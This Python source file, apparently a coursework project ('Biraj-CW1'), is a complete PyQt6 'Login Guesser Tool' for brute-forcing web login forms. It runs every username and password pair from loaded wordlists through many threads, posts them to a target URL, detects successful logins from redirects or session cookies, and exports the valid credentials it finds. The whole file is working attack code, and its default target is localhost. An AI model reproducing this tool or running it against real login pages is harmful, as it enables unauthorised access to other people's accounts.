# Biraj-CW1
import sys
import threading
import queue
import requests
from bs4 import BeautifulSoup
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QLineEdit, QPushButton, QTableWidget, QTableWidgetItem,
    QProgressBar, QFileDialog, QMessageBox, QTabWidget, QTextEdit,
    QHeaderView
)
from PyQt6.QtGui import QColor, QBrush, QIntValidator
from PyQt6.QtCore import Qt, pyqtSignal, QObject


def try_login_once(target_url, username, password, timeout=3):
    """Try a single login attempt and return True if successful."""
    try:
        session = requests.Session()
        response_get = session.get(target_url, timeout=timeout)
        print("[GET] Cookies:", session.cookies.get_dict())

        form_data = {
            'uname': username,
            'password': password
        }

        response_post = session.post(
            target_url,
            data=form_data,
            allow_redirects=False,
            timeout=timeout
        )

        print("[POST] Status Code:", response_post.status_code)
        print("[POST] Cookies:", session.cookies.get_dict())

        if response_post.status_code == 302 and 'index.php' in response_post.headers.get('Location', ''):
            return True
        elif response_post.status_code == 200:
            soup = BeautifulSoup(response_post.text, 'html.parser')
            if soup.find('em', string='Invalid login'):
                return False
            if 'PHPSESSID' in session.cookies.get_dict():
                return True

        return False
    except requests.RequestException as e:
        print("Request error:", e)
        return False


class LoginWorker(QObject):
    update_signal = pyqtSignal(str, str, bool)
    progress_signal = pyqtSignal(int)
    completed_signal = pyqtSignal()
    error_signal = pyqtSignal(str)

    def __init__(self, target_url, username_list, password_list, thread_count, timeout):
        super().__init__()
        self.target_url = target_url
        self.username_list = username_list
        self.password_list = password_list
        self.thread_count = thread_count
        self.timeout = timeout
        self.stop_event = threading.Event()
        self.queue = queue.Queue()
        self.total_attempts = len(username_list) * len(password_list)

        # Fill the queue with all combinations
        for username in username_list:
            for password in password_list:
                self.queue.put((username.strip(), password.strip()))

    def run(self):
        threads = []
        for _ in range(self.thread_count):
            thread = threading.Thread(target=self.worker)
            thread.daemon = True
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()
        self.completed_signal.emit()

    def worker(self):
        session = requests.Session()
        while not self.queue.empty() and not self.stop_event.is_set():
            try:
                username, password = self.queue.get_nowait()
                success = self.try_login(session, username, password)
                self.update_signal.emit(username, password, success)
                self.progress_signal.emit(1)
            except queue.Empty:
                break
            except Exception as e:
                self.error_signal.emit(f"Error: {str(e)}")

    def try_login(self, session, username, password):
        try:
            # First GET request to get cookies
            session.get(self.target_url, timeout=self.timeout)

            # Prepare form data
            form_data = {
                'uname': username,
                'password': password
            }

            # Send POST request
            response = session.post(
                self.target_url,
                data=form_data,
                allow_redirects=False,
                timeout=self.timeout
            )

            # Check for success indicators
            if response.status_code == 302:
                if 'Location' in response.headers and 'index.php' in response.headers['Location']:
                    return True
            elif response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                if soup.find('em', string='Invalid login'):
                    return False
                if 'session' in response.cookies.get_dict() or 'PHPSESSID' in response.cookies.get_dict():
                    return True

            return False
        except requests.RequestException:
            return False

    def stop(self):
        self.stop_event.set()


class LoginGuesserGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Login Guesser Tool")
        self.setGeometry(100, 100, 900, 700)

        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)

        tab_widget = QTabWidget()
        main_layout.addWidget(tab_widget)

        # Attack Tab
        attack_tab = QWidget()
        tab_widget.addTab(attack_tab, "Attack Configuration")
        attack_layout = QVBoxLayout(attack_tab)

        url_layout = QHBoxLayout()
        url_layout.addWidget(QLabel("Target Login URL:"))
        self.url_input = QLineEdit("http://localhost/webapp/login.php")
        url_layout.addWidget(self.url_input)
        attack_layout.addLayout(url_layout)

        lists_layout = QHBoxLayout()

        # Username list
        username_layout = QVBoxLayout()
        username_layout.addWidget(QLabel("Username List:"))
        self.username_text = QTextEdit()
        self.username_text.setPlaceholderText("Enter usernames, one per line")
        username_layout.addWidget(self.username_text)
        username_btn_layout = QHBoxLayout()
        self.load_usernames_btn = QPushButton("Load from File")
        self.load_usernames_btn.clicked.connect(self.load_usernames)
        username_btn_layout.addWidget(self.load_usernames_btn)
        self.clear_usernames_btn = QPushButton("Clear")
        self.clear_usernames_btn.clicked.connect(lambda: self.username_text.clear())
        username_btn_layout.addWidget(self.clear_usernames_btn)
        username_layout.addLayout(username_btn_layout)
        lists_layout.addLayout(username_layout)

        # Password list
        password_layout = QVBoxLayout()
        password_layout.addWidget(QLabel("Password List:"))
        self.password_text = QTextEdit()
        self.password_text.setPlaceholderText("Enter passwords, one per line")
        password_layout.addWidget(self.password_text)
        password_btn_layout = QHBoxLayout()
        self.load_passwords_btn = QPushButton("Load from File")
        self.load_passwords_btn.clicked.connect(self.load_passwords)
        password_btn_layout.addWidget(self.load_passwords_btn)
        self.clear_passwords_btn = QPushButton("Clear")
        self.clear_passwords_btn.clicked.connect(lambda: self.password_text.clear())
        password_btn_layout.addWidget(self.clear_passwords_btn)
        password_layout.addLayout(password_btn_layout)
        lists_layout.addLayout(password_layout)

        attack_layout.addLayout(lists_layout)

        settings_layout = QHBoxLayout()

        thread_layout = QVBoxLayout()
        thread_layout.addWidget(QLabel("Thread Count:"))
        self.thread_input = QLineEdit("5")
        self.thread_input.setValidator(QIntValidator(1, 50))
        thread_layout.addWidget(self.thread_input)
        settings_layout.addLayout(thread_layout)

        timeout_layout = QVBoxLayout()
        timeout_layout.addWidget(QLabel("Timeout (seconds):"))
        self.timeout_input = QLineEdit("3")
        self.timeout_input.setValidator(QIntValidator(1, 30))
        timeout_layout.addWidget(self.timeout_input)
        settings_layout.addLayout(timeout_layout)

        attack_layout.addLayout(settings_layout)

        btn_layout = QHBoxLayout()
        self.start_btn = QPushButton("Start Attack")
        self.start_btn.clicked.connect(self.start_attack)
        btn_layout.addWidget(self.start_btn)
        self.stop_btn = QPushButton("Stop Attack")
        self.stop_btn.clicked.connect(self.stop_attack)
        self.stop_btn.setEnabled(False)
        btn_layout.addWidget(self.stop_btn)
        attack_layout.addLayout(btn_layout)

        self.progress_bar = QProgressBar()
        self.progress_bar.setAlignment(Qt.AlignmentFlag.AlignCenter)
        attack_layout.addWidget(self.progress_bar)

        # Results Tab
        results_tab = QWidget()
        tab_widget.addTab(results_tab, "Results")
        results_layout = QVBoxLayout(results_tab)

        self.results_table = QTableWidget()
        self.results_table.setColumnCount(3)
        self.results_table.setHorizontalHeaderLabels(["Username", "Password", "Status"])
        self.results_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        results_layout.addWidget(self.results_table)

        export_layout = QHBoxLayout()
        export_layout.addStretch()
        self.export_btn = QPushButton("Export Results")
        self.export_btn.clicked.connect(self.export_results)
        export_layout.addWidget(self.export_btn)
        results_layout.addLayout(export_layout)

        self.status_bar = self.statusBar()
        self.status_bar.showMessage("Ready")

        self.worker_thread = None
        self.worker = None

        self.apply_dark_theme()

    def apply_dark_theme(self):
        self.setStyleSheet("""
            QMainWindow {
                background-color: #2D2D30;
            }
            QWidget {
                background-color: #2D2D30;
                color: #FFFFFF;
            }
            QTabWidget::pane {
                border: 1px solid #3F3F46;
                background: #252526;
            }
            QTabBar::tab {
                background: #333337;
                color: #CCCCCC;
                padding: 8px;
                border-top-left-radius: 4px;
                border-top-right-radius: 4px;
            }
            QTabBar::tab:selected {
                background: #1E1E1E;
                color: #FFFFFF;
            }
            QLabel {
                color: #CCCCCC;
            }
            QLineEdit, QTextEdit {
                background-color: #1E1E1E;
                color: #FFFFFF;
                border: 1px solid #3F3F46;
                border-radius: 4px;
                padding: 5px;
            }
            QPushButton {
                background-color: #007ACC;
                color: #FFFFFF;
                border: none;
                border-radius: 4px;
                padding: 8px 16px;
            }
            QPushButton:hover {
                background-color: #1C97EA;
            }
            QPushButton:disabled {
                background-color: #505050;
            }
            QTableWidget {
                background-color: #1E1E1E;
                color: #FFFFFF;
                gridline-color: #3F3F46;
                border: 1px solid #3F3F46;
            }
            QHeaderView::section {
                background-color: #333337;
                color: #FFFFFF;
                padding: 4px;
                border: none;
            }
            QProgressBar {
                border: 1px solid #3F3F46;
                border-radius: 4px;
                text-align: center;
                background-color: #1E1E1E;
            }
            QProgressBar::chunk {
                background-color: #007ACC;
                width: 10px;
            }
        """)

    def load_usernames(self):
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Open Usernames File", "", "Text Files (*.txt);;All Files (*)"
        )
        if file_path:
            try:
                with open(file_path, 'r') as f:
                    self.username_text.setText(f.read())
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to load file: {str(e)}")

    def load_passwords(self):
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Open Passwords File", "", "Text Files (*.txt);;All Files (*)"
        )
        if file_path:
            try:
                with open(file_path, 'r') as f:
                    self.password_text.setText(f.read())
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to load file: {str(e)}")

    def start_attack(self):
        target_url = self.url_input.text().strip()
        usernames = self.username_text.toPlainText().splitlines()
        passwords = self.password_text.toPlainText().splitlines()

        if not target_url:
            QMessageBox.warning(self, "Warning", "Please enter a target URL")
            return
        if not usernames or not any(username.strip() for username in usernames):
            QMessageBox.warning(self, "Warning", "Please enter at least one username")
            return
        if not passwords or not any(password.strip() for password in passwords):
            QMessageBox.warning(self, "Warning", "Please enter at least one password")
            return

        try:
            thread_count = int(self.thread_input.text())
            timeout = int(self.timeout_input.text())
        except ValueError:
            QMessageBox.warning(self, "Warning", "Please enter valid numbers for thread count and timeout")
            return

        self.results_table.setRowCount(0)
        self.progress_bar.setValue(0)

        total_attempts = len(usernames) * len(passwords)
        self.progress_bar.setMaximum(total_attempts)

        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.status_bar.showMessage(f"Starting attack with {thread_count} threads...")

        self.worker = LoginWorker(target_url, usernames, passwords, thread_count, timeout)
        self.worker.update_signal.connect(self.update_result)
        self.worker.progress_signal.connect(self.update_progress)
        self.worker.completed_signal.connect(self.attack_completed)
        self.worker.error_signal.connect(self.show_error)

        self.worker_thread = threading.Thread(target=self.worker.run)
        self.worker_thread.daemon = True
        self.worker_thread.start()

    def stop_attack(self):
        if self.worker:
            self.worker.stop()
            self.status_bar.showMessage("Attack stopped by user")
            self.start_btn.setEnabled(True)
            self.stop_btn.setEnabled(False)

    def update_result(self, username, password, success):
        row_position = self.results_table.rowCount()
        self.results_table.insertRow(row_position)
        self.results_table.setItem(row_position, 0, QTableWidgetItem(username))
        self.results_table.setItem(row_position, 1, QTableWidgetItem(password))
        status_item = QTableWidgetItem("Success" if success else "Failure")
        if success:
            status_item.setBackground(QBrush(QColor(40, 160, 60)))
            self.results_table.scrollToItem(status_item)
        else:
            status_item.setBackground(QBrush(QColor(180, 60, 60)))
        self.results_table.setItem(row_position, 2, status_item)

    def update_progress(self, increment):
        current_value = self.progress_bar.value()
        self.progress_bar.setValue(current_value + increment)
        total = self.progress_bar.maximum()
        self.status_bar.showMessage(f"Progress: {current_value + increment}/{total} ({(current_value + increment)/total*100:.1f}%)")

    def attack_completed(self):
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.status_bar.showMessage("Attack completed!")

        success_count = sum(1 for row in range(self.results_table.rowCount()) if self.results_table.item(row, 2).text() == "Success")
        if success_count > 0:
            QMessageBox.information(self, "Attack Complete", f"Found {success_count} valid credentials.")
        else:
            QMessageBox.information(self, "Attack Complete", "No valid credentials found.")

    def show_error(self, message):
        self.status_bar.showMessage(message)
        QMessageBox.warning(self, "Error", message)

    def export_results(self):
        file_path, _ = QFileDialog.getSaveFileName(self, "Save Results", "", "Text Files (*.txt);;CSV Files (*.csv)")
        if file_path:
            try:
                with open(file_path, 'w') as f:
                    if file_path.endswith('.csv'):
                        f.write("Username,Password,Status\n")
                        for row in range(self.results_table.rowCount()):
                            username = self.results_table.item(row, 0).text()
                            password = self.results_table.item(row, 1).text()
                            status = self.results_table.item(row, 2).text()
                            f.write(f'"{username}","{password}","{status}"\n')
                    else:
                        for row in range(self.results_table.rowCount()):
                            username = self.results_table.item(row, 0).text()
                            password = self.results_table.item(row, 1).text()
                            status = self.results_table.item(row, 2).text()
                            f.write(f"{username}:{password} - {status}\n")
                QMessageBox.information(self, "Success", "Results exported successfully!")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to export results: {str(e)}")


if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = LoginGuesserGUI()
    window.show()
    sys.exit(app.exec())